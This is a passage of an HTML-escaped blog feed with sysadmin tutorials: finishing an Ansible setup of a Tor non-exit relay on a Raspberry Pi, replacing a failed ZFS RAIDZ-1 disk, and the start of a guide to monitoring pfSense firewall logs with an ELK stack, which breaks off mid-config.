&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 3/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=net.core.rmem_max&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=26214400&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 4/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=net.core.wmem_max&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=26214400&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 5/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=net.core.rmem_default&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=26214400&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set sysctl settings 6/6&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;sysctl&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=net.core.wmem_default&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;value=26214400&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=present&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Setup tor&lt;/h2&gt;
&lt;p&gt;Finally create the tasks that will setup tor and
start it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;set rights&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;file&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dest=/var/lib/tor owner=debian-tor recurse=yes&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;stat logrotate for tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;stat&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;path=/etc/logrotate.d/tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;register&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;logrotate_stat&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;disable logrotate for tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;command&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;mv /etc/logrotate.d/tor /etc/logrotate.d/tor.disabled&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;when&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;logrotate_stat.stat.exists&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;become&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;setup torrc&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;template&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;src=/tmp/torrc.j2&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;dest=/etc/tor/torrc&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;become&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;enable tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;service&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=tor&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;enabled=yes&lt;/span&gt;

&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;start tor&lt;/span&gt;
  &lt;span class="l l-Scalar l-Scalar-Plain"&gt;service&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;name=tor&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;state=restarted&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The jinja &lt;a href="https://docs.ansible.com/ansible/template_module.html"&gt;template&lt;/a&gt; used for the &lt;code&gt;torrc&lt;/code&gt;
file is the following and has to be
saved in a file named &lt;code&gt;/tmp/torrc.j2&lt;/code&gt; (it is referenced in the above &lt;em&gt;setup torrc&lt;/em&gt; task):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;Log notice file /var/log/tor/notices.log&lt;/span&gt;
&lt;span class="x"&gt;RunAsDaemon 1&lt;/span&gt;
&lt;span class="x"&gt;ControlPort 9051&lt;/span&gt;
&lt;span class="x"&gt;ORPort &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;torport&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;DirPort &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;dirport&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;Nickname &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;nodename&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;ExitPolicy reject *:* # no exits allowed&lt;/span&gt;
&lt;span class="x"&gt;User debian-tor&lt;/span&gt;
&lt;span class="x"&gt;DisableDebuggerAttachment 0&lt;/span&gt;
&lt;span class="x"&gt;AvoidDiskWrites 1&lt;/span&gt;
&lt;span class="x"&gt;SocksPort 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;For more information on the different options used on your tor relay,
see the &lt;a href="https://www.torproject.org/docs/tor-manual.html.en"&gt;official doc&lt;/a&gt;
and the &lt;a href="https://www.torproject.org/docs/faq"&gt;FAQ&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Running the playbook&lt;/h2&gt;
&lt;p&gt;Now it's time to actually execute this playbook so that all the above defined
tasks will be applied on the Raspberry Pi.&lt;/p&gt;
&lt;p&gt;Copy your public ssh key to your Raspberry Pi:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh-copy-id pi@&amp;lt;rpi-IP&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And make sure you're able to ssh to your Raspberry Pi with your key.&lt;/p&gt;
&lt;p&gt;create the inventory file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;[rpitor]&amp;#39;&lt;/span&gt; &amp;gt; /tmp/torpi.hosts
$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;rpi-IP&amp;gt;&amp;#39;&lt;/span&gt; &amp;gt;&amp;gt; /tmp/torpi.hosts
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and then run the playbook:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ansible-playbook -u pi -i /tmp/torpi.hosts rpitor.yml
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can of course run the same playbook multiple times since ansible provides
idempotency (running multiple times will end up with the same result).&lt;/p&gt;
&lt;h2&gt;Final steps&lt;/h2&gt;
&lt;p&gt;Now you can reboot your Raspberry Pi to make sure you're running the latest kernel.&lt;/p&gt;
&lt;p&gt;Also make sure you opened the needed ports on your firewall, &lt;code&gt;torport&lt;/code&gt; and
&lt;code&gt;dirport&lt;/code&gt; set in the &lt;code&gt;rpitor.yml&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;In order to monitor your tor relay, you can use the arm tool: &lt;code&gt;sudo -u debian-tor arm&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once your relay is running, you can get information about your relay on &lt;a href="https://atlas.torproject.org/"&gt;atlas&lt;/a&gt;.&lt;/p&gt;</content><category term="tor"></category><category term="privacy"></category><category term="raspberrypi"></category><category term="ansible"></category></entry><entry><title>Replacing a disk on a ZFS pool</title><link href="https://deadc0de.re/articles/zfs-disk-replace.html" rel="alternate"></link><published>2016-10-19T00:00:00+02:00</published><updated>2016-10-19T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-10-19:/articles/zfs-disk-replace.html</id><summary type="html">&lt;p&gt;Replacing a disk on a ZFS pool&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is what happened to me the other day on my RAIDZ-1:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo zpool status apool -x
  pool: apool
 state: DEGRADED
status: One or more devices are faulted in response to persistent errors.
  Sufficient replicas exist &lt;span class="k"&gt;for&lt;/span&gt; the pool to &lt;span class="k"&gt;continue&lt;/span&gt; functioning in a
  degraded state.
action: Replace the faulted device, or use &lt;span class="s1"&gt;&amp;#39;zpool clear&amp;#39;&lt;/span&gt; to mark the device
  repaired.
  scan: scrub repaired &lt;span class="m"&gt;0&lt;/span&gt; in 3h53m with &lt;span class="m"&gt;0&lt;/span&gt; errors
config:

  NAME        STATE     READ WRITE CKSUM
  apool       DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
    raidz1-0  DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
      b       ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
      c       FAULTED      &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;140&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  too many errors
      d       ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="m"&gt;11&lt;/span&gt;

errors: No known data errors
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is as bad as it looks like. I had a ZFS pool with 3 disks and one decided to fail.
I had seen some smart warning but never gave it the attention needed
... my bad ... now it needs to be taken care of.&lt;/p&gt;
&lt;h1&gt;Identifying the device&lt;/h1&gt;
&lt;p&gt;The first step is to identify the device. A first method is to get each device's serial
number using &lt;a href="https://www.smartmontools.org/"&gt;smartctl&lt;/a&gt;. Obviously if your disk is unreachable
by &lt;code&gt;smartctl&lt;/code&gt;, you'll have to get the healthy ones's serials and go by deduction from there.&lt;/p&gt;
&lt;p&gt;Here's the &lt;code&gt;smartctl&lt;/code&gt; command to get a device's serial:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo smartctl -i /dev/sdXXX &lt;span class="p"&gt;|&lt;/span&gt; grep -i &lt;span class="s1"&gt;&amp;#39;Serial Number&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Another way is to use &lt;code&gt;ledctl&lt;/code&gt; from the &lt;a href="https://sourceforge.net/projects/ledmon/"&gt;ledmon&lt;/a&gt;
tool. A little software which will allow you to control storage leds and thus identify physically
your device.&lt;/p&gt;
&lt;p&gt;Here's how the pool looks like once the failing disk has been removed:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo zpool status
  pool: apool
 state: DEGRADED
status: One or more devices could not be used because the label is missing or
  invalid.  Sufficient replicas exist &lt;span class="k"&gt;for&lt;/span&gt; the pool to &lt;span class="k"&gt;continue&lt;/span&gt;
  functioning in a degraded state.
action: Replace the device using &lt;span class="s1"&gt;&amp;#39;zpool replace&amp;#39;&lt;/span&gt;.
   see: http://zfsonlinux.org/msg/ZFS-8000-4J
  scan: scrub repaired &lt;span class="m"&gt;0&lt;/span&gt; in 4h5m with &lt;span class="m"&gt;0&lt;/span&gt; errors
config:

  NAME                      STATE     READ WRITE CKSUM
  apool                     DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
    raidz1-0                DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
      b                     ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
      &lt;span class="m"&gt;11743263287665849900&lt;/span&gt;  FAULTED      &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  was /dev/mapper/c
      c                     ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;

errors: No known data errors
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is still working but in a &lt;em&gt;degraded&lt;/em&gt; state, what means that hopefully no other disk
goes sick !&lt;/p&gt;
&lt;h1&gt;Replacing the disk in the pool&lt;/h1&gt;
&lt;p&gt;Once you get your new device, here's the process to replace it in the zfs pool.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo zpool status
  pool: apool
 state: DEGRADED
status: One or more devices could not be used because the label is missing or
        invalid.  Sufficient replicas exist &lt;span class="k"&gt;for&lt;/span&gt; the pool to &lt;span class="k"&gt;continue&lt;/span&gt;
        functioning in a degraded state.
action: Replace the device using &lt;span class="s1"&gt;&amp;#39;zpool replace&amp;#39;&lt;/span&gt;.
   see: http://zfsonlinux.org/msg/ZFS-8000-4J
  scan: scrub repaired &lt;span class="m"&gt;0&lt;/span&gt; in 3h55m with &lt;span class="m"&gt;0&lt;/span&gt; errors
config:

        NAME                      STATE     READ WRITE CKSUM
        apool                     DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
          raidz1-0                DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
            b                     ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
            &lt;span class="m"&gt;11743263287665849900&lt;/span&gt;  UNAVAIL      &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  was /dev/mapper/c
            d                     ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;

errors: No known data errors
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First put the old device offline:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo zpool offline apool &lt;span class="m"&gt;11743263287665849900&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And finally replace with the new mounted disk:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo zpool replace apool /dev/mapper/c
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now the pool is rebuilding using the new disk (&lt;em&gt;resilvering&lt;/em&gt; in the zfs world):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo zpool status
  pool: apool
 state: DEGRADED
status: One or more devices is currently being resilvered.  The pool will
        &lt;span class="k"&gt;continue&lt;/span&gt; to &lt;span class="k"&gt;function&lt;/span&gt;, possibly in a degraded state.
action: Wait &lt;span class="k"&gt;for&lt;/span&gt; the resilver to complete.
  scan: resilver in progress
    116G scanned out of &lt;span class="m"&gt;4&lt;/span&gt;.53T at 264M/s, 4h52m to go
    &lt;span class="m"&gt;38&lt;/span&gt;.5G resilvered, &lt;span class="m"&gt;2&lt;/span&gt;.49% &lt;span class="k"&gt;done&lt;/span&gt;
config:

        NAME                        STATE     READ WRITE CKSUM
        apool                       DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
          raidz1-0                  DEGRADED     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
            b                       ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
            replacing-1             OFFLINE      &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;
              &lt;span class="m"&gt;11743263287665849900&lt;/span&gt;  OFFLINE      &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  was /dev/mapper/c/old
              c                     ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="o"&gt;(&lt;/span&gt;resilvering&lt;span class="o"&gt;)&lt;/span&gt;
            d                       ONLINE       &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;

errors: No known data errors
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;With the above command, you can see the progress &lt;code&gt;...resilvered, 2.49% done...&lt;/code&gt; and the
expected duration: &lt;code&gt;4h52m to go&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Hopefully, you will end up with something like that: &lt;code&gt;scan: resilvered 1.51T in 5h2m with 0 errors&lt;/code&gt;.
My resilvering took a bit more than 5 hours. After that my pool was back in shape. Thanks zfs !&lt;/p&gt;</content><category term="zfs"></category><category term="disk"></category><category term="failure"></category></entry><entry><title>Monitor pfsense firewall with ELK</title><link href="https://deadc0de.re/articles/pfsense-elk.html" rel="alternate"></link><published>2016-10-02T00:00:00+02:00</published><updated>2016-10-02T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2016-10-02:/articles/pfsense-elk.html</id><summary type="html">&lt;p&gt;Monitor pfsense firewall with ELK&lt;/p&gt;</summary><content type="html">&lt;p&gt;This is a post on how to monitor your &lt;a href="https://pfsense.org/"&gt;Pfsense&lt;/a&gt; firewall with
an ELK stack (&lt;a href="https://www.elastic.co/"&gt;Elasticsearch&lt;/a&gt;, &lt;a href="https://www.elastic.co/products/logstash"&gt;Logstash&lt;/a&gt;
and &lt;a href="https://www.elastic.co/products/kibana"&gt;Kibana&lt;/a&gt;)
running on &lt;a href="https://www.docker.com"&gt;docker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The final goal is to be able to view what is being blocked by your firewall. It
is always fun and interesting to be able to review who's scanning you, on what port.
With ELK (thanks to logstash), we'll add geoip information to each blocked IPs to be
able to draw a map of who's scanning you from which country.&lt;/p&gt;
&lt;p&gt;Here are the different steps for this setup:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;install docker&lt;/li&gt;
&lt;li&gt;prepare the configs files&lt;/li&gt;
&lt;li&gt;prepare docker image&lt;/li&gt;
&lt;li&gt;run docker container&lt;/li&gt;
&lt;li&gt;play with the data on Kibana&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Once done, that's the kind of dashboard you could have to monitor your firewall:
&lt;a href="https://deadc0de.re/images/kibana.png"&gt;&lt;img alt="kibana dashboard" src="https://deadc0de.re/images/kibana.png" width="800px"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;Install docker&lt;/h2&gt;
&lt;p&gt;Follow the instructions for your distribution on
the &lt;a href="https://docs.docker.com/engine/installation/linux/"&gt;docker's installation doc&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once docker's installed, retrieve the &lt;a href="https://hub.docker.com/r/sebp/elk/"&gt;docker image&lt;/a&gt;
on which we will base our stack:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;docker pull sebp/elk
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All the below files need to be put in the same folder to ease the setup
with docker, so start by creating a folder, like for example &lt;em&gt;docker-elk&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Logstash&lt;/h2&gt;
&lt;p&gt;Logstash is the tool that parses the logs and formats them to a
viable structure for Elasticsearch.&lt;/p&gt;
&lt;p&gt;The below grok file is used to match each log entry to different fields in order to
be correctly parsed by Elasticsearch/kibana.&lt;/p&gt;
&lt;p&gt;This file is originally from
&lt;a href="https://gist.github.com/bradvido/4e6501222b8f7dbe3ba8"&gt;this gist&lt;/a&gt;, save it into &lt;code&gt;docker-elk/pfsense.2.2.grok&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# GROK match pattern for logstash.conf filter: %{LOG_DATA}%{IP_SPECIFIC_DATA}%{IP_DATA}%{PROTOCOL_DATA}

# GROK Custom Patterns (add to patterns directory and reference in GROK filter for pfSense events):

# GROK Patterns for pfSense 2.2 Logging Format
#
# Created 27 Jan 2015 by J. Pisano (Handles TCP, UDP, and ICMP log entries)
# Edited 14 Feb 2015 by E. Paul
#
# Usage: Use with following GROK match pattern
#
# %{LOG_DATA}%{IP_SPECIFIC_DATA}%{IP_DATA}%{PROTOCOL_DATA}

LOG_DATA (%{INT:rule}),(%{INT:sub_rule}),,(%{INT:tracker}),(%{WORD:iface}),(%{NOTSPACE:reason}),(%{WORD:action}),(%{WORD:rule_direction}),(%{INT:ip_ver}),

IP_SPECIFIC_DATA (%{IPv4_SPECIFIC_DATA}|%{IPv6_SPECIFIC_DATA})

IPv4_SPECIFIC_DATA (%{BASE16NUM:tos}),,(%{INT:ttl}),(%{INT:id}),(%{INT:offset}),(%{WORD:flags}),(%{INT:proto_id}),(%{WORD:proto}),

IPv6_SPECIFIC_DATA (%{BASE16NUM:class}),(%{DATA:flow_label}),(%{INT:hop_limit}),(%{WORD:proto}),(%{INT:proto_id}),

IP_DATA (%{INT:length}),(%{IP:src_ip}),(%{IP:dest_ip}),

PROTOCOL_DATA (%{TCP_DATA}|%{UDP_DATA}|%{ICMP_DATA})

TCP_DATA (%{INT:src_port}),(%{INT:dest_port}),(%{INT:data_length}),(%{WORD:tcp_flags}),(%{NOTSPACE:sequence_number}),(%{INT:ack_number}?),(%{INT:tcp_window}),(%{DATA:urg_data}),(%{DATA:tcp_options})

UDP_DATA (%{INT:src_port}),(%{INT:dest_port}),(%{INT:data_length})

ICMP_DATA (%{ICMP_TYPE}%{ICMP_RESPONSE})

ICMP_TYPE (?&amp;lt;icmp_type&amp;gt;(request|reply|unreachproto|unreachport|unreach|timeexceed|paramprob|redirect|maskreply|needfrag|tstamp|tstampreply)),

ICMP_RESPONSE (%{ICMP_ECHO_REQ_REPLY}|%{ICMP_UNREACHPORT}| %{ICMP_UNREACHPROTO}|%{ICMP_UNREACHABLE}|%{ICMP_NEED_FLAG}|%{ICMP_TSTAMP}|%{ICMP_TSTAMP_REPLY})

ICMP_ECHO_REQ_REPLY (%{INT:icmp_echo_id}),(%{INT:icmp_echo_sequence})

ICMP_UNREACHPORT (%{IP:icmp_unreachport_dest_ip}),(%{WORD:icmp_unreachport_protocol}),(%{INT:icmp_unreachport_port})

ICMP_UNREACHPROTO (%{IP:icmp_unreach_dest_ip}),(%{WORD:icmp_unreachproto_protocol})

ICMP_UNREACHABLE (%{GREEDYDATA:icmp_unreachable})

ICMP_NEED_FLAG (%{IP:icmp_need_flag_ip}),(%{INT:icmp_need_flag_mtu})

ICMP_TSTAMP (%{INT:icmp_tstamp_id}),(%{INT:icmp_tstamp_sequence})

ICMP_TSTAMP_REPLY (%{INT:icmp_tstamp_reply_id}),(%{INT:icmp_tstamp_reply_sequence}),(%{INT:icmp_tstamp_reply_otime}),(%{INT:icmp_tstamp_reply_rtime}),(%{INT:icmp_tstamp_reply_ttime})
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we need to setup the logstash config so that it:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;listens on UDP port 5000 for logs to parse&lt;/li&gt;
&lt;li&gt;uses the above grok file to parse the entries&lt;/li&gt;
&lt;li&gt;adds geoip to each entry&lt;/li&gt;
&lt;li&gt;outputs to Elasticsearch&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Save the following into &lt;code&gt;docker-elk/pfsense.conf&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;input {
  udp {
    port =&amp;gt; 5000
    type =&amp;gt; &amp;quot;syslog&amp;quot;
  }
}

filter {
  grok {
    patterns_dir =&amp;gt; &amp;quot;/etc/logstash/patterns&amp;quot;
    match =&amp;gt; [ &amp;quot;message&amp;quot;, &amp;quot;%{LOG_DATA}%{IP_SPECIFIC_DATA}%{IP_DATA}%{PROTOCOL_DATA}&amp;quot; ]
  }
  geoip {
    source =&amp;gt; &amp;quot;src_ip&amp;quot;
  }
}

output {
        elasticsearch {
          hosts =&amp;gt; [&amp;quot;localhost:9200&amp;quot;]
